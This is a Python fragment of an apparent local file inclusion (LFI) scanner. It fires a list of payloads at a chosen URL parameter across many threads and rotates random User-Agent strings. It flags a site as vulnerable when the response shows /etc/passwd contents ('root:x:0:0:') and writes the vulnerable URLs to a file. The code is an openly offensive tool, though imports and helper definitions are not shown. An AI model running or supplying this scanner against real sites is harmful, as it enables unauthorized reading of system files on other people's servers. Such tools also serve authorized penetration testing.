def send_request(url,pram,payload):
    vul_url=f"{url}?{pram}={payload}"
    headers = {"User-Agent": random.choice(user_agets)}
    response = requests.get(vul_url, headers=headers,timeout=2.5,proxies=None)
    try:
        if response.status_code==200 and "root:x:0:0:" in response.text :
            print(f"{GREEN}[!] LFI Found! Payload:              [{vul_url:<50}]                  [{response.status_code}]{RESET}")
            return vul_url
        else:
             print(f"{RED} [-] No LFI: Payload:                  [{vul_url:<50}]                [{response.status_code}]{RESET}")

    except requests.RequestException as e:
        print(f"{RED}[!] Error with payload {payload}: {e}{RESET}")

def check_payload(url,pram,file_path,thread):
    try:
        with open(file_path,'r') as file:
            payloads = file.read().splitlines() 
    except FileNotFoundError:
        print(f"[!] Payload file not found: {file_path}")
        return
    results=[]
    with ThreadPoolExecutor(max_workers=thread) as executor:
        tasks= {executor.submit(send_request,url,pram,payload):payload for payload in payloads}

        for future in as_completed(tasks):
            # payload = tasks[future]
            try:
                result = future.result()
                if result :
                    results.append(result) 
            except Exception as e:
                pass
        return results
def Save_file(vuln_url,filename):
    try:
        with open(filename,'w') as file:
            for url in vuln_url:
                file.write(url)
                file.write("\n")
            print(f"The Vuln Url's Are Saved In {filename}")
    except Exception as e:
        print(f"[!] Unable to Save : {e}")  

